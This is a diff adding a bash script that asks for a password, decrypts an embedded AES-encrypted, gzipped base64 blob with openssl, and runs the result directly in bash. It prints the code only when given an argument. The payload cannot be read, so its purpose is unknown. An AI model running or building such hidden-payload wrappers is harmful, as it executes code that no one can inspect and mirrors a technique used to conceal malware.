@@ -1,0 +1,32 @@
+#!/bin/bash
+
+echo
+echo "Password for Host please !!"
+echo
+
+showcode() {
+cat <<'EOF' | openssl enc -aes256 -iter 61 -base64 -d | gunzip -
+U2FsdGVkX1/bJVNW70PB0icDw3ZzaEFo3MmgPRuAMV/QjTIEQYpD1Dtku++yiwbY
+PxPl/b++hl2xYlx06Yl4QOMO23kJLxvAtB054MnHSWEbXfkc3U5/omHm/DpAEiQF
+Egkq1r9/40bV62bSFvK00qNSfV6XvbcOHgGRL3GR/XkO2LMmP8uV3bKzedmLFFWo
+1a3h6P2yuVU2s7HXI8I1ja5GAkqGaSSaOUsiMrd6ET3bKK/05ewnNfxKJnzrRX8r
+IUWH3yDCzLYGBN3P1hramFWe7mT6dFb3yVAFBQ8slXLF77qKKAOtQmqJ2BnUc7uq
+3LO6yAdQbMDmIGcPesORaX/Lbxa+XlGFDQ1apO6jOqKqTxpcZcx8uuTKNommjhIr
+AmFLCPVovEoRbUqhlWhcljqLxKg1JEDn3GaMIJKDn7gfByFwmQonOmJ9cJT9Pkv/
+NO124Id0zfrM2CT2fbvWgl0SBgIsWn90DkHmB6xTWFdj8CBvwLQpMse8imdhu4Ex
+xeuqzRsruDixCR4BpFr5KfGeAR3nMyNrlbFAxtCQY/mWqBU8yOK44TOUrYv+DGPa
+9fzHOs45saVAIe9yuV8/aS0G2onrCMUg+85JcoaZ6tJSCkf/jzOaG7kyyhLvYGzc
+v31FqYf35Lx3ZuKLhmcUBAotjKPtDKfwxR3nxUpoddAPEd1S9VV9QxXv+NNAvFTu
+PWwbszcRGffw0ryamyjonqfQ3sZkT/B4VAg5vwwsvtl81bQPcFD9kMDax7ViFBLy
+00+8RoD9ZbtB5h3nVehn00czFKMIoGO5d9i+7jHsm898a0kgfAvUu5dK1zAwFlB+
+HcLNrFGklMw/R0MhJtri9hozrX4JQT3j3sh0rHLREJPHwKpBbTcQWaG1WxHpt50h
+h6UtsmsXZHjMiMT2KJQ4/rHlxUy3p7+vNrrd70knnSibaT0Tnbwu8UZogqk21Weh
+lbPZrAQdLnwAYG7iUXR/LELM2xcJTnoTU8BllJkAJPvSlNFhjjyqg0y3BkejRPiK
+EOF
+}
+
+if [[ $1 != '' ]]; then
+  showcode
+else
+  bash <(showcode)
+fi
